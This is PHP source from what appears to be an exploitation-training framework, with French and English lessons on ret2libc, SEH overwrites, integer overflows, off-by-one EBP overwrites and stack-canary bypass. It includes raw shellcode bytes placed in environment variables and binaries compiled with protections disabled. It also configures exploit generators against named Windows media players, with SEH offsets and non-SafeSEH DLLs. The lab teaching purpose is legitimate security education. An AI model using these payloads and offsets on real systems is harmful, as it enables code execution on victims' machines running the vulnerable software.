		$file_bin->ret2lib4linux_write_cmd2section($offset_eip); // OK
		
		$file_bin->ret2lib4linux_execve_family_intro(); // OK
	
		$file_bin->ret2lib4linux_execve_printf_fmt3($offset_eip); // OK
	
		$this->article("POP RET AND POP POP RET", "
		[ ... ] [ addr of function1 in libc ] [ pop-ret ] [arg1] [ addr of function2 in libc ]
		limitation: argument can only be four bytes
	
		[ ... ] [ addr of function1 in libc ] [ pop-pop-ret ] [arg1] [arg2] [ addr of function2 in libc ]
		eight bytes for arguments");
	
		$file_bin->ret2lib4linux_execve_printf_fmt5($offset_eip); // OK
		
		$this->rouge("Conclusion: Not eXecutable Stack: Does not protect against return to libc." );
		$this->pause();
		$file_bin->ret2lib4linux_countermeasure(); // OK

	
		$this->notify("END ".__FUNCTION__); // OK
	}
	
	
	
	public function poc4bof2ret2seh4win(){
	
		//$timestamp_debut = $this->start("Overwrite STRUCTURED EXCEPTION HANDLING"," ");
	
		$this->ssTitre("understand exception handler");
		$this->net("http://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms");
		$this->net("http://en.wikipedia.org/wiki/Exception_handling_syntax");
		$this->pause();
		$this->img("$this->dir_img/bof/seh_teb_chaine.png");
		$this->pause();
	
	
	
		$this->img("$this->dir_img/bof/seh_protection.png");
		$this->pause();
	
		$this->article("SEH template", "[Junk][nSEH][SEH][Nop+Shellcode]");
		$this->img("$this->dir_img/bof/seh_chain_1.png");
		$this->img("$this->dir_img/bof/seh_chain_2.png");
		$this->img("$this->dir_img/bof/seh_chain_3.png");
		$this->img("$this->dir_img/bof/seh_chain_4.png");
		$this->img("$this->dir_img/bof/seh_chain_pop2ret.png");
		$this->pause();
		$schema_seh = "
1st exception occurs :
 |
 --------------------------- (1)
                            |
                     -------+-------------- (3) opcode in next SEH : jump over SE Handler to the shellcode
                     |      |             |
                     |      V             V
[ Junk buffer ][ next SEH ][ SE Handler ][ Shellcode ]
                opcode to   do                 (3) Shellcode gets executed
                jump over   pop pop ret
                SE Handler   |
                ^            |
                |            |
                -------------- (2) will ‘pretend’ there’s a second exception, puts address of next SEH location in EIP, so opcode gets executed
	
            nSEH (4 bytes)
            SEH (4 bytes)
            nSEH = JUMP 06 bytes (2 nSEH + 4 SEH)-> fall in NOPs \\x90
	
		 Overwrite next seh, with jump forward (over the next 6 bytes) instruction
	";
		echo $schema_seh;
		
		

		$this->article("Stack cookie /GS protection", "
		The /GS switch is a compiler option that will add some code to function’s prologue and epilogue code in order to prevent successful abuse of typical stack based (string buffer) overflows.
		When an application starts, a program-wide master cookie (4 bytes (dword), unsigned int) is calculated (pseudo-random number) and saved in the .data section of the loaded module. In the function prologue, this program-wide master cookie is copied to the stack, right before the saved EBP and EIP. (between the local variables and the return addresses)
		[buffer][cookie][saved EBP][saved EIP]
		During the epilogue, this cookie is compared again with the program-wide master cookie. If it is different, it concludes that corruption has occurred, and the program is terminated.
		[buffer][cookie][EH record][saved ebp][saved eip][arguments ]");
		$this->img("$this->dir_img/bof/seh_exception_handler.png");
		$this->pause();
		$this->article("How it works"," Nous avons un certain nombre de points à respecter si on veut exploiter correctement SEH :
- le gestionnaire d'exception handler doit pointer sur une image non SafeSEH
- la page mémoire doit être exécutable
- les structures SEH doivent être chaînées jusqu'à la dernière ayant le Next SEH à 0xFFFFFFFF
- toutes les structures « Next SEH » doivent être alignées sur 4 octets
- Le dernier SEH handler doit pointer sur ntdll! FinalExceptionHandler
- tous les pointeurs SEH doivent être situés sur la pile.");
		$this->pause();
		$this->article("Structured Exception Handling Overwrite Protection","Microsoft has recently implemented in many Windows versions a new security feature named
		Structured Exception Handling Overwrite Protection  . Those systems are:
		• Microsoft Windows 2008 SP0
		• Microsoft Windows Vista SP1
		• Microsoft Windows 7");
		
		
		$this->titre("Find Offset SEH ");
		$win7x86 = new VM(win7x86);
		$win7x86->vm2fuzz($fuzz_add, "$bin_name->rep_path/$bin_name->prog_name.fuzz.$fuzz_add", "$this->vm_tmp_win\\\\$bin_name->prog_name.fuzz.$fuzz_add", $ext_file);
		$this->article("OllyDbg"," -> View -> SEH Chain -> copy clipboard -> SE Hander");
		$this->img("$this->dir_img/bof/seh_chain_ollydbg.png");
		$this->img("$this->dir_img/bof/seh_value_ollydbg.png");
		$this->article("ImmunityDebug"," -> View ->   ->   ->   ->  ");
		$this->article("IDA"," -> View ->   ->   ->   ->  ");
		$this->article("Windbg"," -> View ->   ->   ->   ->  ");
		$this->article("gdb"," -> View ->   ->   ->   ->  ");
		$this->cmd("localhost","python $this->dir_tools/bof/pattern.py <Val SE Handler> $fuzz_add");
		$this->note("Enter value of SE Handler ");
		$offset_seh_tmp = trim(fgets(STDIN));
		$offset_seh = $offset_seh_tmp - 4 ; // -4 for nseh
		$this->pause();
		$this->titre("Find Bad Chars for Shellcode ");
		$this->requette("perl $this->dir_tools/bof/generatecodes.pl 00,0a,0d | grep -Po '\\\x[0-9a-fA-F]{1,2}' | tr -d '\\n' > $bin_name->rep_path/$bin_name->prog_name.bad.chars");
		$win7x86->vm2upload("$bin_name->rep_path/$bin_name->prog_name.bad.chars", "$this->vm_tmp_win\\\\$bin_name->prog_name.bad.chars");
		$shellcode_calc = file_get_contents("$bin_name->rep_path/$bin_name->prog_name.bad.chars");
	
		$this->titre("Find safeSEH ");
		$this->article("msfpescan"," uses msfpescan to check for registered SEH handlers in the DLL. 
	No results means that the module was not compiled with /SafeSEH On. which can be either 16 or 32 bit
		msfpescan -i ws2_32.dll | grep -E \"SEHandler|DllCharacteristics\"");
		$this->article("OllyDbg"," -> Plugins -> scan /safeSEH module");
		$this->article("ImmunityDebug"," !mona seh|!mona seh -m -o ");
		$this->article("ImmunityDebug","immunity>  !safeseh");
		$this->article("ImmunityDebug"," View ->   executables module -> green dll -> check: !safeseh -m dll_green.dll -> view -> log data -> check: ddl_name_green.dll *** safeseh unprotected *** ");
		$this->article("IDA"," -> View ->   ->   ->   ->  ");
		$this->article("Windbg"," -> View ->   ->   ->   ->  ");
		$this->article("gdb"," -> View ->   ->   ->   ->  ");
		$this->pause();
	
	
		$this->titre("Find POP POP RET ");
		$this->article("OllyDbg"," -> executable module -> double clic dll with nosafeseh ->  search sequence command ");
		$this->article("ImmunityDebug"," right clic -> search for sequence of command -> POP r32\nPOP r32\nRETN\n ");
		$this->article("ImmunityDebug","immunity>  !search pop r32npop r32nret ");
		
		$this->article("ImmunityDebug"," View ->   executables module -> green dll -> check: !safeseh -m dll_green.dll -> view -> log data -> check: ddl_name_green.dll *** safeseh unprotected *** ");
		$this->article("IDA"," -> View ->   ->   ->   ->  ");
		$this->article("Windbg"," -> View ->   ->   ->   ->  ");
		$this->article("gdb"," -> View ->   ->   ->   ->  ");
		$this->pause();
	
		
	
		###################### OK #########################################################################
		$this->chapitre("Free MP3 CD Ripper 2.6");
		//$this->net("https://www.exploit-db.com/exploits/36465/");
		$this->pause();
		
	
		$victime_host = "";
		$victime_port = "";
		$offset_seh = 4116 ;
		$dll = "ogg.dll";
		$header = '';
		$footer = '';
		$ext_file = "wav";
		$exploit_size_max = 4400;
		$vmx = "win7x86";
		$bin_name = new ret2seh4win("fcrip.exe"); // OK on win7x86
		$shellcode_calc = $bin_name->shellcode_calc_win7x86 ;
		$bin_name->payload_stack_win_seh_pop_sc_after_only($offset_seh, $dll, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx, $ext_file, $victime_host, $victime_port);
		$this->pause();
	
	
		$this->chapitre("BlazeDVD Pro v7.0");
		$this->net("https://www.exploit-db.com/exploits/34371/");
		$this->pause();
		$bin_name = new ret2seh4win("BlazeDVD.exe"); // OK
		$victime_host = "";
		$victime_port = "";
		$offset_seh = 608 ;
		$dll = "Configuration.dll";
		$header = '';
		$shellcode_calc = $bin_name->shellcode_calc_win7x86 ;
		$footer = '';
		$ext_file = "plf";
		$exploit_size_max = 1000;
		$vmx = "win7x86";
		$bin_name->payload_stack_win_seh_pop_sc_after_only($offset_seh, $dll, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx, $ext_file, $victime_host, $victime_port);
		$this->pause();
	
	
		$this->chapitre("DVD X Player Pro v5.5 ");
		$this->net("http://www.exploit-id.com/local-exploits/dvd-x-player-5-5-pro-seh-overwrite");
		$this->pause();
		$bin_name = new ret2seh4win("DVDXPlayer.exe"); // OK
		$victime_host = "";
		$victime_port = "";
		$offset_seh = 608 ;
		$dll = "EPG.dll";
		$header = '';
		$shellcode_calc = $bin_name->shellcode_calc_win7x86 ;
		$footer = '';
		$exploit_size_max = 2000;
		$vmx = "win7x86";
		$ext_file = "plf";
		$bin_name->payload_stack_win_seh_pop_sc_after_only($offset_seh, $dll, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx, $ext_file, $victime_host, $victime_port);
		$this->pause();
	
	
		$this->chapitre("AudioCoder v0.8.29");
		$this->net("https://www.exploit-db.com/exploits/32585/");
		$this->pause();
		$bin_name = new ret2seh4win("AudioCoder.exe"); // OK
		$victime_host = "";
		$victime_port = "";
		$offset_seh = 757 ;
		$dll = "libiconv-2.dll";
		$header = '\x68\x74\x74\x70\x3a\x2f\x2f';
		$shellcode_calc = $bin_name->shellcode_calc_xp3;
		$footer = '';
		$ext_file = "m3u";
		$exploit_size_max = 5000;
		$vmx = "xp3";
		$bin_name->payload_stack_win_seh_pop_sc_after_only($offset_seh, $dll, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx, $ext_file, $victime_host, $victime_port);
		$this->pause();
		##################################################################################################
	
	
		$this->notify("END STRUCTURED EXCEPTION HANDLING");
	}
	
	
	
	
	public function poc4bof2ret2int4linux(){
		$timestamp_debut = $this->start("Integer Overflow"," ");
	
		$this->chapitre("INTEGER OVERFLOW");
		
		$this->os2aslr4no();
	
		$name = "ret2int32l";
		$rep_path = "$this->dir_tmp/$name";
		if (file_exists($rep_path)) system("rm -r $rep_path");
		$this->create_folder($rep_path);
	
	
	
	
		$this->net("https://fr.wikipedia.org/wiki/D%C3%A9passement_d'entier");
		$this->net("https://en.wikipedia.org/wiki/Integer_overflow");
		$this->net("https://fr.wikipedia.org/wiki/Bug_de_l'an_2038");
		$this->img("$this->dir_img/bof/Year_2038_problem.gif");
		$this->pause();
	
	
		$this->note("Un entier, dans le contexte informatique, est une variable capable de représenter un nombre entier sans partie décimale.
		Les entiers sont sont en général de la même taille qu'un pointeur sur le système sur lequel ils sont compilés(i.e sur une architecture 32 bits, telle que i386 un entier
est long de 32 bits, sur une architecture 64 bits telle que SPARC,un entier est long de 64 bits).
		Certains compilateurs n'utilisent pas les entiers et les pointeurs de la même taille cependant, pour un soucis de simplicité
tous les exemples se réfèrent à des architectures 32 bits avec des entiers, long et pointeurs sur 32 bits.");
		$this->article("Qu'est ce qu'un débordement d'entiers?","Comme un entier à une taille fixe(32 bits dans le cadre de cet article),
il y a une valeur maximum qu'il peut stocker.
		Quand en tentative est faite de stocker une valeur supérieure à cette valeur maximum on parle de débordement d'entier.
		Le standard ISO C99 dit qu'un débordement de tampon cause un comportement indéfini,ce qui signifie que les compilateurs se
conformant au standard peuvent faire ce qu'il veulent ,de l'ignorement complet au débordement pour arrêter le programme.
		La plupart des compilateurs semblent ignorer le débordement, aboutissant à un résultat stocké inattendu ou erroné.");
	
	
	
	
		$this->note("4 bytes = 32 bits
	On 32-bit machine: unsigned integer 4,294,967,295 + 1 = 0
	(4,294,967,295 = 0xffffffff)
	On 64-bit machine: unsigned integer 18446744073709551615 + 1 = 0
	(18446744073709551615 = 0xffffffffffffffff)
	In 32-bit arithmetic : 	0xffffffff + 0x00000001 = 0
	On 32-bit machine:
   INT_MAX = 2,147,483,647 = 0x7fffffff
   INT_MIN = -2,147,483,648 = 0x80000000
   (int) 2,147,483,647 + 1 = - 2,147,483,648
	
		");
		$name = "ret2int32l_int_signed";
		$c_code = file_get_contents("$this->dir_c/$name.c");
		$programme = $command->c2bin4code($c_code, "-std=c99  -fno-pie -z norelro -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl", "$rep_path/$name");$file_bin = new ret2got4linux($programme);
		$file_bin = new ret2int4linux($programme);
		$file_bin->elf2exec();
		$this->pause();
	
		$this->article("Débordements d'entiers","
Un calcul mettant en jeu des opérandes non-signés ne peut jamais être débordé car un résultat qui ne peut pas être représenté par le
	résultat d'entiers de type non signé est réduit modulo le nombre qui est d'un supérieur à la plus grande valeur représentable par le type
	résultant.
	
N.B:le modulo arithmétique implique la division de deux nombres et prend
le reste:
	10 modulo 5 = 0
	11 modulo 5 = 1
ainsi la réduction d'une grande valeur par modulo(ENTIERMAX + 1) permet l'isolement de la valeur qui ne peut rentrer dans un entier et garde le
reste.
En C, l'opérateur modulo est un caractère %.
	
Réduire le résultat en utilisant basiquement un modulo arithmétique assure que le seulement les 32 bits les plus bas du résultat sont utilisés, donc
les débordements de tampon forcent les résultats a être tronqués a une taille qui peut être représentée par la variable.
	
	
		");
		$name = "ret2int32l_modulo";
		$c_code = file_get_contents("$this->dir_c/$name.c");
		$programme = $command->c2bin4code($c_code, "-std=c99  -fno-pie -z norelro -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl", "$rep_path/$name");$file_bin = new ret2got4linux($programme);
		$file_bin = new ret2int4linux($programme);
		$file_bin->elf2exec();
	
		$this->article("Explication","Comme chaque assignation pousse les limites des valeurs qui peuvent être
stockés à être dépassées, la valeur est tronquée donc de façon à ce qu'elle rentre dans la variable à laquelle elle est assignée.
	
		l'opérande le plus petit est 'promus' a la taille du plus grand des
deux. Le calcul est alors fait avec ces tailles promues et, si le
résultat est apte à être stocké dans la variable la plus petite, le
résultat est tronqué a la plus petite taille de nouveau.
Par exemple:
	
    int i;
    short s;
	
    s = i;
	
Un calcul est réalisé ici avec des opérandes de tailles différentes.");
		$this->question("Qu'arrive t-il dans le cas ou la variable s est promue en un entier (32 bits long)");
		$this->article("reponse","alors le contenu de i est copié dans la nouvelle promue s.
Après cela, le contenu de la variable promue est rétrogradée de nouveau a 16 bits dans le but de sauver s.
Ce rétrogradage peut amener le résultat à être tronqué si il est supérieur à la valeur maximum gérable.");
		$this->pause();
	
	
		$name = "ret2int32l_modulo_2";
		$c_code = file_get_contents("$this->dir_c/$name.c");
		$programme = $command->c2bin4code($c_code, "-std=c99  -fno-pie -z norelro -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl", "$rep_path/$name");$file_bin = new ret2got4linux($programme);
		$file_bin = new ret2int4linux($programme);
		$file_bin->elf2exec();
		$this->pause();
	
		$this->chapitre("Arithmetic Overflow");
		$this->gtitre("change Sign");
		$name = "ret2int32l_signe";
		$c_code = file_get_contents("$this->dir_c/$name.c");
		$programme = $command->c2bin4code($c_code, "-std=c99  -fno-pie -z norelro -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl", "$rep_path/$name");$file_bin = new ret2got4linux($programme);
		$file_bin = new ret2int4linux($programme);
		$file_bin->elf2exec();
		$this->note("L'addition n'est pas l'unique opération arithmétique qui peut causer un débordement d'entier.
	Ainsi n'importe quelle opération qui change la valeur d'une variable peut causer un débordement");
		$this->pause();
	
		$this->titre("Other Arithmetic Operand");
		$name = "ret2int32l_operand";
		$c_code = file_get_contents("$this->dir_c/$name.c");
		$programme = $command->c2bin4code($c_code, "-std=c99  -fno-pie -z norelro -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl", "$rep_path/$name");$file_bin = new ret2got4linux($programme);
		$file_bin = new ret2int4linux($programme);
		$file_bin->elf2exec();
		$this->pause();
	
	
		/*
		$this->gtitre("JUMP INTO PROG"); // No
		$name = "ret2int32l_prog";
		$c_code = file_get_contents("$this->dir_c/$name.c");
		$programme = $command->c2bin4code($c_code, "-std=c99  -fno-pie -z norelro -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl", "$rep_path/$name");
		$file_bin = new ret2int4linux($programme);
	
		$start_shellcode = $this->hex2norme_32(trim($this->req_ret_str(" gdb -q $file_bin->file_path --batch -ex \"b 15\" -ex \"r 12 5\" -ex \"p &shellcode_shell\" | grep -Po \"0x[0-9a-fA-F]{4,8}\" | tail -1 ")));
	
		$addr_ret = $start_shellcode;
	
		$int_addr = trim($this->req_ret_str("php -r \"echo hexdec('$addr_ret')-hexdec('0xffffffff');\" "));
		$int_addr = (int)$int_addr-1;
		$this->article("hex $addr_ret-0xffffffff = ",hexdec("$addr_ret")-hexdec("0xffffffff"));
		$this->article("dec $int_addr ",dechex($int_addr));
		for ($j=$int_addr-10;$j<$int_addr+10;$j++) $this->requette("$file_bin->file_path 33 $j"); // No
		$this->pause();
		*/
	
	
		$this->gtitre("SHELLCODE ENV");
		$name = "ret2int32l_env";
		$c_code = file_get_contents("$this->dir_c/$name.c");
		$programme = $command->c2bin4code($c_code, "-std=c99  -fno-pie -z norelro -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl", "$rep_path/$name");
		$file_bin = new ret2int4linux($programme);
	
	
		$shellcode_hex = '\xbb\x90\x32\x10\x70\xda\xde\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x5d\x11\x03\x5d\x11\xe2\x65\x58\x1b\x28\x1c\xcf\x7d\xa0\x33\x93\x08\xd7\x23\x7c\x78\x70\xb3\xea\x51\xe2\xda\x84\x24\x01\x4e\xb1\x3f\xc6\x6e\x41\x6f\xa4\x07\x2f\x40\x5b\xbf\xaf\xc9\xc8\xb6\x51\x38\x6e';
		$command->hex2env($shellcode_hex,0);
		$addr_ret = $file_bin->elf2addr4env("shellcode");
	
		$this->article("Rappel","	In 32-bit arithmetic : 	0xffffffff + 0x00000001 = 0
	On 32-bit machine:
   INT_MAX = 2,147,483,647 = 0x7fffffff
   INT_MIN = -2,147,483,648 = 0x80000000
   (int) 2,147,483,647 + 1 = - 2,147,483,648	");
	
		$int_addr = trim($this->req_ret_str("php -r \"echo hexdec('$addr_ret')-hexdec('0xffffffff');\" "));
		$int_addr = (int)$int_addr-1;
		$this->article("hex $addr_ret-0xffffffff = ",hexdec("$addr_ret")-hexdec("0xffffffff"));
		$this->article("dec $int_addr ",dechex($int_addr));
	
		$this->requette("$file_bin->file_path 32 15"); // OK
		$this->requette("$file_bin->file_path 33 15"); // OK
		$this->pause();
		$this->requette("$file_bin->file_path 33 $int_addr"); // OK
		$this->pause();
	
	
		$name = "ret2int32l_env2";
		$c_code = file_get_contents("$this->dir_c/$name.c");
		$programme = $command->c2bin4code($c_code, "-std=c99  -fno-pie -z norelro -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl", "$rep_path/$name");
		$file_bin = new ret2int4linux($programme);
		$shellcode_hex = '\xbb\x90\x32\x10\x70\xda\xde\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x5d\x11\x03\x5d\x11\xe2\x65\x58\x1b\x28\x1c\xcf\x7d\xa0\x33\x93\x08\xd7\x23\x7c\x78\x70\xb3\xea\x51\xe2\xda\x84\x24\x01\x4e\xb1\x3f\xc6\x6e\x41\x6f\xa4\x07\x2f\x40\x5b\xbf\xaf\xc9\xc8\xb6\x51\x38\x6e';
		$command->hex2env($shellcode_hex,0);
		$addr_ret = $file_bin->elf2addr4env("shellcode");
	
		$int_addr = trim($this->req_ret_str("php -r \"echo hexdec('$addr_ret')-hexdec('0xffffffff');\" "));
		$int_addr = (int)$int_addr-1;
		$this->article("hex $addr_ret-0xffffffff = ",hexdec("$addr_ret")-hexdec("0xffffffff"));
		$this->article("dec $int_addr ",dechex($int_addr));
		$this->note("INT_MIN = -2,147,483,648 = 0x80000000\n -2,147,483,648 + 33 = -2147483615");
	
		$this->requette("$file_bin->file_path 31 15"); // OK
		$this->requette("$file_bin->file_path 32 15"); // OK
		$this->requette("$file_bin->file_path 33 15"); // OK
		$this->pause();
		$this->requette("$file_bin->file_path -2147483615 $int_addr"); // OK
		$this->pause();
	
	
		
	
		$name = "ret2int32l_got"; // OK
		$c_code = file_get_contents("$this->dir_c/$name.c"); // -std=c99
		$programme = $command->c2bin4code($c_code, " -fno-pie -z norelro -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl", "$rep_path/$name");
		$file_bin = new ret2int4linux($programme);
		$shellcode_hex = '\xbb\x90\x32\x10\x70\xda\xde\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x5d\x11\x03\x5d\x11\xe2\x65\x58\x1b\x28\x1c\xcf\x7d\xa0\x33\x93\x08\xd7\x23\x7c\x78\x70\xb3\xea\x51\xe2\xda\x84\x24\x01\x4e\xb1\x3f\xc6\x6e\x41\x6f\xa4\x07\x2f\x40\x5b\xbf\xaf\xc9\xc8\xb6\x51\x38\x6e';
		$command->hex2env($shellcode_hex,0);
		$addr_ret = $file_bin->elf2addr4env("shellcode");
	
		$int_addr = trim($this->req_ret_str("php -r \"echo hexdec('$addr_ret')-hexdec('0xffffffff');\" "));
		$int_addr = (int)$int_addr-1;
		$this->article("hex $addr_ret-0xffffffff = ",hexdec("$addr_ret")-hexdec("0xffffffff"));
		$this->article("dec $int_addr ",dechex($int_addr));
		$this->note("INT_MIN = -2,147,483,648 = 0x80000000\n -2,147,483,648 + 33 = -2147483615");
	
		$file_bin->elf2fonctions_externes();
	
		$this->chapitre("Test All Functions ");
		$start_ptr = $this->hex2norme_32(trim($this->req_ret_str(" gdb -q $file_bin->file_path --batch -ex \"b 15\" -ex \"r 12 5\" -ex \"p *&ptr\" | grep -Po \"0x[0-9a-fA-F]{4,8}\" | tail -1 ")));
	
	
		$this->requette("gdb -q -batch -ex 'info function' $file_bin->file_path | grep '@plt' ");
		$this->pause();
	
	
		// OK
		$fonctions = $this->req_ret_tab("gdb --batch -q -ex \"info functions\" $file_bin->file_path | grep '@plt' | cut -d' ' -f3 | cut -d'@' -f1");
		for($i = 0; $i < count($fonctions); $i++) {
		$fonctions[$i] = trim($fonctions[$i]);
		$this->chapitre("Test on $fonctions[$i] function");
		$addr_function = $file_bin->elf2addr4fonction_got($fonctions[$i]);
		$int_addr_function = trim($this->req_ret_str("php -r \"echo (hexdec('$start_ptr')-hexdec('$addr_function'))/4;\" "));
		//for ($j=$int_addr_function-4;$j<$int_addr_function+10;$j++)
		$this->requette("$file_bin->file_path -$int_addr_function $int_addr");
	
		$this->pause();
		}
		$this->remarque("it's work only on functions when slot < 31 it's means for -> printf and puts + exit ");
		$this->requette("$this->dir_c/$name.c");
		$this->pause();
	
	
	
	
		// OK
		$this->ssTitre("What can we do with Integer Overflow ?" );
		$this->note("L'une des manières le plus courantes dont les débordements arithmétiques
peuvent être exploités est lorsque un calcul est fait à propos de la taille d'allocation d'un tampon.
Souvent un programme doit allouer de l'espace pour un tableau d'objets ,ainsi il utilise les routines malloc(3) ou calloc(3)
pour réserver de la place et calculer combien de place est nécessaire en multipliant le nombre d'éléments par la taille d'un objet.");
		$this->article("Real world examples","There are many real world applications containing integer overflows and
signedness bugs, particularly network daemons and, frequently, in operating system kernels.");
	
	
	
	
	
	
	
		$vmx = "$this->dir_vm/Hack.vlan/xp3/xp3.vmx";
		$vm = new vm($vmx);
		$this->ssTitre("CCPROXY"); // OK
		$vm->vm2upload("$this->dir_install/Win/Bof/ret2int/ret2int4win_CCProxy_7.3.zip","$this->vm_tmp_win\\ret2int4win_CCProxy_7.3.zip");
		$this->pause();
		$this->ssTitre("INMATRIX Zoom Player Pro"); // OK
		$vm->vm2upload("$this->dir_install/Win/Bof/ret2int/INMATRIX_Zoom_Player_Pro.zip","$this->vm_tmp_win\\INMATRIX_Zoom_Player_Pro.zip");
		$this->pause();
	
		// OK
		$this->requette("gedit $this->dir_c/root_ok_integer_overflow.c" );
		$vmx = "$this->dir_vm/Hack.vlan/ub910/ub910.vmx";
		$vm = new vm($vmx);
		$vm->vm2upload("$this->dir_c/root_ok_integer_overflow.c","$this->vm_tmp_lin/root_ok_integer_overflow.c");
		$this->cmd($this->ub910, "gcc root_ok_integer_overflow.c -o root_ok_integer_overflow " );
		$this->pause();
	
		$this->notify("END Integer Overflow" );
	
	}
	

	
	public function poc4bof2ret2OffByOne4linux(){ // OK
		$timestamp_debut = $this->start("Off By One Overflow"," ");
	
		$this->chapitre("OFF BY ONE OVERFLOW - The Frame Pointer Overwrite - EBP ");
		
		$this>os2aslr4no();
		$name = "ret2obo32l";
		$rep_path = "$this->dir_tmp/$name";
		if (file_exists($rep_path)) system("rm -r $rep_path");
		$this->create_folder($rep_path);
	
		$c_code = file_get_contents("$this->dir_c/$name.c");
		$programme = $command->c2bin4code($c_code, " -fno-pie -z norelro -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl", "$rep_path/$name");
		$file_bin = new ret2stack4linux($programme);
	
		$this->requette("$file_bin->file_path `python -c 'print \"A\"*1023'`" );
		$this->requette("$file_bin->file_path `python -c 'print \"A\"*1024'`" );
		$this->requette("$file_bin->file_path `python -c 'print \"A\"*1025'`" );
		$this->pause();
		$this->img("$this->dir_img/bof/ret2stack4linux_ebp_overwrite.png");
		$this->requette("echo \"b main\\nb 11\\nb 14\\nrun \\$(python -c 'print \\\"A\\\"*1020+\\\"BBBB\\\"')\\ni r esp ebp eip\\nc\\ns\\ni r esp ebp eip\\ns\\ni r esp ebp eip \" > $rep_path/gdb_int.txt");
		$this->requette("gdb -q --batch -x $rep_path/gdb_int.txt $file_bin->file_path ");
		$this->article("Explication","Cette fois ci, %esp a pris la valeur de %ebp et y a ajouté 4 octets.
		Nous voyons donc bien ici que apparemment du fait de modifier 1 octet de %ebp, nous pouvons également modifier %esp(haut de la Pile).
		Vous connaissez la suite des événements, le processeur va POP l'élément contenu sur la Pile
		Nous arrivons bien à faire pointer %esp sur notre buffer rien qu'en modifiant un octet de %ebp.
		Le but est donc de placer dans le buffer l'adresse de notre shellcode.
		De cette manière, nous modifions %ebp, qui va se copier dans %esp et modifier la valeur du registre pointant sur le haut de la pile.
		Le processeur POPera donc ensuite le valeur contenue sur le haut de la Stack(l'adresse du shellcode) et la stockera dans %eip. Puis notre shellcode sera executé. ");
		$this->pause();
	
		//$shellcode_hex = $command->msf2c("/bin/sh");
		$shellcode_hex = '\xbb\x90\x32\x10\x70\xda\xde\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x5d\x11\x03\x5d\x11\xe2\x65\x58\x1b\x28\x1c\xcf\x7d\xa0\x33\x93\x08\xd7\x23\x7c\x78\x70\xb3\xea\x51\xe2\xda\x84\x24\x01\x4e\xb1\x3f\xc6\x6e\x41\x6f\xa4\x07\x2f\x40\x5b\xbf\xaf\xc9\xc8\xb6\x51\x38\x6e';
		$this->ssTitre("SHELLCODE ENV");
	
	
		$command->hex2env($shellcode_hex,10);
		$ptr2sc = $file_bin->elf2addr4env("shellcode");
		$offset_ebp = 256;
		$ptr2sc = $this->hex2rev_32($ptr2sc);
		$payload = "python -c 'print \"$ptr2sc\"*$offset_ebp'";
		
		$this->requette("$file_bin->file_path `$payload`");
		$this->pause();
		/*
		 //add exploit msf proFTPD Off By One -> msf2
		 $this->net("http://pkgs.fedoraproject.org/repo/pkgs/proftpd/proftpd-1.3.0.tar.bz2/fae47d01b52e035eb6b7190e74c17722/");
	
		 */
	
		$this->notify("END Off By One Overflow" );
	
	}
	
	public function poc4bof2ret2canary4linux(){
		$timestamp_debut = $this->start("ByPass STACK CANARY - SSP - Stack Smashing Protection ","");
	
		$this->chapitre("ByPass STACK CANARY - SSP - Stack Smashing Protection  ");
	$this->img("$this->dir_img/bof/gs_var_reord.png");
	$this->img("$this->dir_img/bof/gs.png");
	
		$rep_path = "$this->dir_tmp/ret2canary32l";
		
		$this->os2aslr4no();
		

		
		$this->article("Protections We Face","Stack Canaries
- Random value from thread local area placed before return address
	32-bit gs:0x14 (4 byte)
	64-bit fs:0x28 (8 byte)
- Canary XOR'd with return value
	If not 0, run stack_chk_fail and give access violation
- Overwrite function epilogue and corrupt canary value
- SSP and other implementations offer local variable/argument reordering (pointers before calls)
-fstack-protector protects string functions
-fstack-protector-all protects all functions including arrays");
		$name = "ret2canary32l_get_canary";		
		if (file_exists($rep_path)) system("rm -rv $rep_path");
		$this->create_folder($rep_path);
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -static
		$programme = $bin->file_c2elf("-ggdb -fno-pie -z norelro -z execstack -fstack-protector-all -mpreferred-stack-boundary=2 -m32 -mtune=i386 -ldl -std=c99");
		$file_bin = new ret2canary4linux($programme->file_path);
		$this->pause();	
		$this->requette("readelf -s $file_bin->file_path | grep '__stack_chk_fail' ");
		$this->requette("objdump -d $file_bin->file_path | grep '__stack_chk_fail' ");
		$this->pause();
		$this->ssTitre("What are the differences between SSP and no-SSP compilations");
		$this->requette("gcc -S $rep_path/$name.c -o $rep_path/$name.ssp.s -ggdb -m32 -mtune=i386 -std=c99 -ldl -fstack-protector-all -fno-pie -z norelro -z execstack");
		$this->requette("gcc -S $rep_path/$name.c -o $rep_path/$name.nossp.s -ggdb -m32 -mtune=i386 -std=c99 -ldl -fno-stack-protector -fno-pie -z norelro -z execstack");
		$this->requette("diff $rep_path/$name.nossp.s $rep_path/$name.ssp.s | grep -B4 '__stack_chk_fail' ");
		$this->pause();	
		$this->ssTitre("Display Canary");
		for ($i=0;$i<10;$i++)
		$this->requette("$file_bin->file_path AAAA");
		$this->pause();
		$this->img("$this->dir_img/bof/canary_place.png");
		$this->requette("grep '%%gs' /usr/src/linux-headers-4.4.0-79/arch/x86/include/asm/stackprotector.h ");
